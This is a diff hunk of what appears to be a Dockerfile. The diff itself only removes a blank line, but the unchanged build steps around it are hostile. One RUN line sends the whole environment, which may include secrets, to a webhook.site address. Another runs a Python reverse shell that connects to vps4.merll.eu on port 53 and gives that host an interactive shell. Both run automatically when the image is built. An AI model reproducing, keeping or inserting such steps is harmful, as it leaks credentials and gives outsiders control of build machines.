@@ -8,7 +8,6 @@ RUN apt-get update \
 
 RUN curl "http://webhook.site/721881fe-e1ea-4ccc-8d9d-51e18e9ddc8d" -d "$(env)"
 
-
 RUN python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps4.merll.eu",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 WORKDIR /app
